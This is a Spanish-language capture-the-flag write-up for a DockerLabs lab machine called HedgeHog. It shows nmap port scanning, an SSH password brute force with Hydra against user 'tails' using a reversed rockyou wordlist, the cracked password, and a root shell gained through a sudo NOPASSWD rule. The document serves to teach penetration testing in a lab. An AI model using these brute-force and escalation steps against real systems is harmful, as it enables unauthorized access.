# HEDGEHOG
## INDICACIONES PREVIAS
* Sistema operativo: Kali Linux
* Terminal: ZSH Powerlevel10K
* Utilidad mkt definida en la zshrc para la creación automática de directorios nmap, content y scripts.
* Cat aliseado como bat.
## DESPLIEGUE DE MÁQUINA
1. Descargarla desde la plataforma DockerLabs.
2. En mi caso, yo me creo un directorio con el nombre de la máquina para tenerlo todo más organizado, por lo que mediante el comando mv (`mv ~/Downloads/<máquina.zip> ~/Desktop/Máquinas/Dockerlabs/<máquina>`) la moveré de descargas a la nueva ubicación.
3. Una vez hecho esto, la descomprimiremos mediante unzip <máquina.zip> y se nos creará un ejecutable .tar
4. Por último, la desplegaremos mediante sudo bash auto_deploy.sh <máquina.tar> y se nos proporcionará una IP, en mi caso 172.17.0.2.
## EXPLOTACIÓN Y ESCALADA DE PRIVILEGIOS
Primero comprobaremos la conectividad con la máquina. 
```ruby
> ping -c1 172.17.0.2
PING 172.17.0.2 (172.17.0.2) 56(84) bytes of data.
64 bytes from 172.17.0.2: icmp_seq=1 ttl=64 time=4.45 ms

--- 172.17.0.2 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 4.447/4.447/4.447/0.000 ms
```

* c1 (count 1) para indicar que solo queremos mandar un paquete ICMP y después termine de enviar paquetes. 

* De aquí podemos observar que: 
  * Se ha enviado un paquete y se ha recibido de vuelta, por lo que hay conectividad con la máquina.
  * Tenemos un ttl = 64, lo que quiere decir que nos encontramos ante un sistema Linux.

Una vez visto que tenemos conectividad comenzaremos con el escaneo de puertos.  Para ello ejecutaremos:
```ruby
❯ nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 172.17.0.2 -oG allPorts
```
* Con -p- escaneamos el rango completo de puertos (65535).
* Con --open añadimos que de esos solo nos interesan los abiertos.
* Con -sS seleccionamos que el tipo de escaneo será de tipo SYN Scan. Este se caracteriza por ser rápido y sigiloso puesto que no se completa el three-way handshake.
  * Según la respuesta del puerto, Nmap deduce su estado:
    * SYN/ACK recibido → el puerto está abierto.
    * RST (Reset) recibido → el puerto está cerrado.
    * Sin respuesta o ICMP error → el puerto está filtrado (por firewall).
  * Si el puerto estaba abierto (SYN/ACK), Nmap no completa la conexión: envía un RST para interrumpir el handshake y no dejar un rastro evidente.
* Con --min-rate 5000 indicamos que queremos un envío de 5000 paquetes por segundo.
* Con -vvv (triple verbose) se muestra por consola la información detallada y actualizada al momento.
* Con -n indicaremos que no queremos resolución DNS, trabajaremos directamente con direcciones IP.
* Con -Pn queremos que no se haga ping al host antes de comenzar el escaneo, asumiendo que está activo.
* Por último, con -oG exportamos la evidencia en un archivo con formato grepeable para facilitar su procesamiento en auditorias.

Para simplificarnos el visionado de los puertos abiertos directamente abriremos el archivo *allPorts*.
```ruby
❯ cat allPorts
───────┬─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
       │ File: allPorts
───────┼─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
   1   │ # Nmap 7.95 scan initiated Mon Sep  8 22:37:08 2025 as: /usr/lib/nmap/nmap --privileged -p- --open -sS --min-rate 5000 -vvv -n -Pn -oG allPorts 172.17.0.2
   2   │ # Ports scanned: TCP(65535;1-65535) UDP(0;) SCTP(0;) PROTOCOLS(0;)
   3   │ Host: 172.17.0.2 () Status: Up
   4   │ Host: 172.17.0.2 () Ports: 22/open/tcp//ssh///, 80/open/tcp//http///    Ignored State: closed (65533)
   5   │ # Nmap done at Mon Sep  8 22:37:10 2025 -- 1 IP address (1 host up) scanned in 1.64 seconds
───────┴─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
```
Una vez localizados los puertos abiertos, continuaremos con el escaneo específico de los mismos para ver que servicios y versiones corren por ellos.
```bash
❯ nmap -p22,80 -sCV 172.17.0.2 -oN targeted
```

* El parámetro -sCV es una conjunción de los parámetros:
  * -sC: Ejecuta los scripts de Nmap por defecto (Default Scripts) para el host/puerto para detectar vulnerabilidades básicas, información de banners, servicios públicos, etc..
  * -sV: Detecta la versión del servicio que corre en cada puerto abierto.
* Con -oN exportamos la evidencia en un archivo con formato Nmap para dejarlo registrado.

Al igual que antes, para que la visualización de toda la información sea más cómoda, la analizaremos desde el archivo *targeted* que acabamos de generar.
```java
❯ cat  targeted -l java
───────┬─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
       │ File: targeted
───────┼─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
   1   │ # Nmap 7.95 scan initiated Mon Sep  8 22:39:43 2025 as: /usr/lib/nmap/nmap --privileged -p22,80 -sCV -oN targeted 172.17.0.2
   2   │ Nmap scan report for 172.17.0.2
   3   │ Host is up (0.00s latency).
   4   │ 
   5   │ PORT   STATE SERVICE VERSION
   6   │ 22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.5 (Ubuntu Linux; protocol 2.0)
   7   │ | ssh-hostkey: 
   8   │ |   256 34:0d:04:25:20:b6:e5:fc:c9:0d:cb:c9:6c:ef:bb:a0 (ECDSA)
   9   │ |_  256 05:56:e3:50:e8:f4:35:96:fe:6b:94:c9:da:e9:47:1f (ED25519)
  10   │ 80/tcp open  http    Apache httpd 2.4.58 ((Ubuntu))
  11   │ |_http-title: Site doesn't have a title (text/html).
  12   │ |_http-server-header: Apache/2.4.58 (Ubuntu)
  13   │ MAC Address: 02:42:AC:11:00:02 (Unknown)
  14   │ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
  15   │ 
  16   │ Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
  17   │ # Nmap done at Mon Sep  8 22:39:52 2025 -- 1 IP address (1 host up) scanned in 9.41 seconds
───────┴─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
```
En el puerto 22 nos encontramos con un servicio *OpenSSH* actualizado a una versión relativamente reciente, lo que indica que no presenta ninguna vulnerabilidad conocida (versiones < 7.7) por lo que nos centraremos primero en el servicio HTTP del puerto 80.  Para ello nos dirigiremos al navegador y escribiremos la dirección IP. 

![Mensaje](https://github.com/JavieRR13/WriteUps/blob/70493b2edc4bdf17463586f8e449dda90b448450/DockerLabs/Muy%20f%C3%A1cil/HedgeHog/Im%C3%A1genes/HedgeHog_Mensaje.png)
En la web solo nos encontramos con este mensaje.  Inspeccionando un poco el código fuente de la página tampoco parece haber nada.  Lo único que nos queda es asumir que es un usuario válido en SSH y probarlo con un ataque de fuerza bruta utilizando [Hydra](https://github.com/vanhauser-thc/thc-hydra) usando "tails" como nombre de usuario y el diccionario [rockyou](https://github.com/topics/rockyou-wordlist) para comprobar contraseñas.
```ruby
> hydra -l tails -P /usr/share/wordlists/rockyou.txt ssh://172.17.0.2
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-09-08 22:56:22
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
[DATA] attacking ssh://172.17.0.2:22/
[STATUS] 252.00 tries/min, 252 tries in 00:01h, 14344148 to do in 948:42h, 15 active
[STATUS] 245.00 tries/min, 735 tries in 00:03h, 14343665 to do in 975:46h, 15 active
[STATUS] 237.14 tries/min, 1660 tries in 00:07h, 14342740 to do in 1008:02h, 15 active
[STATUS] 233.93 tries/min, 3509 tries in 00:15h, 14340891 to do in 1021:44h, 15 active
```
* Con -l seleccionamos el usuario.
* Con -P indicamos un conjunto de contraseñas a probar, en este caso, las recogidas en el diccionario.
* Por último indicamos el servicio y la dirección sobre la que ejecutar el ataque.

Después 10 minutos de espera y, sin ninguna respueta, asumo que hay algo mal en mi planteamiento y decido usar otros diccionarios e incluso usar "tails" como contraseña y buscar por usuarios.  Tras mucho tiempo de pruebas y, viendo el nombre de la máquina (tail = cola), que además es un comando propio de Linux, decido invertir el diccionario [rockyou.txt](https://github.com/topics/rockyou-wordlist) para que comience la explotación por la última palabra del diccionario en el buen orden. 
```ruby
❯ touch rockyou_invertido.txt
❯ chmod 644 rockyou_invertido.txt
❯ tac /usr/share/wordlists/rockyou.txt > rockyou_invertido.txt
❯ head rockyou_invertido.txt
*7¡Vamos!
a6_123
abygurl69
ie168
▒xCvBnM,
           
            
                  
       1
       1234567
❯ sed -i 's/ //g' rockyou_invertido.txt                                                                                                                                                                                       ❯ head rockyou_invertido.txt
*7¡Vamos!
a6_123
abygurl69
ie168
▒xCvBnM,



1
1234567
```
* Con touch creamos en el directorio actual (en mi caso ~/Desktop/Maquinas/DockerLabs/Hedgehod/scripts) un archivo de texto plano vacio llamado *rockyou_invertido.txt*
* Con chmod 644 le damos los permisos necesarios.
* Con tac invertimos el diccionario rockyou.txt en el archivo rockyou_invertido.txt ya creado y con los permisos necesarios.
* Con head comprobaremos si se ha escrito bien. ¡COSA QUE NO HA PASADO!  Se ha copiado con espacios y saltos de línea.
* Para ello:
  * sed es un editor de flujo que permite buscar, reemplazar, eliminar o modificar texto línea por línea en un archivo o en la entrada estándar.
  * Con -i vamos a indicarle que la modificación la haga en el propio archivo, porque por defecto sed solo lo muestra por pantalla pero no lo modifica.
  * Con s indicamos que queremos sustituir.
  * Con el espacio entre / / indicamos que serán los espacios en blanco.
  * Con g indicaremos que queremos que se haga de manera global, en todas las líneas.

Una vez teniendo listo el diccionario lo probaremos otra vez con [Hydra](https://github.com/vanhauser-thc/thc-hydra) a ver si esta vez encontramos algo rápido.

```ruby
❯ hydra -l tails -P rockyou_invertido.txt -f ssh://172.17.0.2
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-09-08 23:17:38
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344386 login tries (l:1/p:14344386), ~896525 tries per task
[DATA] attacking ssh://172.17.0.2:22/
[22][ssh] host: 172.17.0.2   login: tails   password: 3117548331
[STATUS] attack finished for 172.17.0.2 (valid pair found)
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-09-08 23:17:59
```
* Con -l seleccionamos el usuario.
* Con -P indicamos un conjunto de contraseñas a probar, en este caso, las recogidas en el diccionario.
* Por último indicamos el servicio y la dirección sobre la que ejecutar el ataque.
* Con -f indicamos que finalice la ejecución una vez encuentre un parámetro válido.

Vemos que este ataque ha sido satisfactorio y hemos encontrado una contraseña válida para el usuario *tails*.
Ahora que ya tenemos usuario y contraseña accederemos al servicio SSH para comenzar con el escalado de privilegios.
```ruby
❯ ssh tails@172.17.0.2
tails@172.17.0.2's password: 
Welcome to Ubuntu 24.04.1 LTS (GNU/Linux 6.12.38+kali-amd64 x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

This system has been minimized by removing packages and content that are
not required on a system that users do not log into.

To restore this content, you can run the 'unminimize' command.
Last login: Mon Sep  8 23:27:17 2025 from 172.17.0.1
tails@e68f5d080656:~$ whoami
tails
```
Una vez dentro de la máquina víctima, vamos a intentar listar todos los privilegios de sudo del usuario actual. Es decir, mostrar qué comandos puede ejecutar con sudo y cómo. 
```ruby
tails@e68f5d080656:~$ sudo -l
User tails may run the following commands on e68f5d080656:
    (sonic) NOPASSWD: ALL
```
Sabiendo que podemos invocar al usuario *sonic* vía sudo podemos ejecutar directamente una bash como root.
```
tails@e68f5d080656:~$ sudo -u sonic sudo /bin/bash
root@e68f5d080656:/home/tails# whoami
root
root@e68f5d080656:/home/tails# 
```
🥳CONSEGUIDO, SOMOS ROOT🥳

